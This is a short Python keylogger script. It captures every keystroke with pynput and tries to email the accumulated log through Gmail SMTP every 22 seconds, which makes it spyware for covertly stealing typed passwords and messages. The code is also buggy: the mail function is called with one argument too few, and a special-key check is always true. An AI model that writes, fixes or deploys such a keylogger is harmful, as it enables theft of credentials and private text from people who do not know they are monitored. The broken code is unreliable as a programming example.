from pynput import keyboard
import smtplib
import threading

log_data = ""

def on_press(key):
    global log_data
    try:
        log_data += key.char
    except AttributeError:
        if keyboard.Key.space and keyboard.Key.enter:
            log_data += " "
        else:
            log_data += str(key)

def on_release(key):
    global log_data
    if key == keyboard.Key.esc:
        print(f"Final Log: {log_data}")
        return False

def send_mail(e_mail,to_email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(e_mail,password) # Enter your gmail and gmail password
    server.sendmail(e_mail,to_email,message) 
    server.quit() 

def threading_func():
    global log_data
    send_mail("a@gmail.com","b@gmail.com",log_data)
    log_data = ""
    timer_object = threading.Timer(22,threading_func)
    timer_object.start()


        
with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    threading_func()
    listener.join()


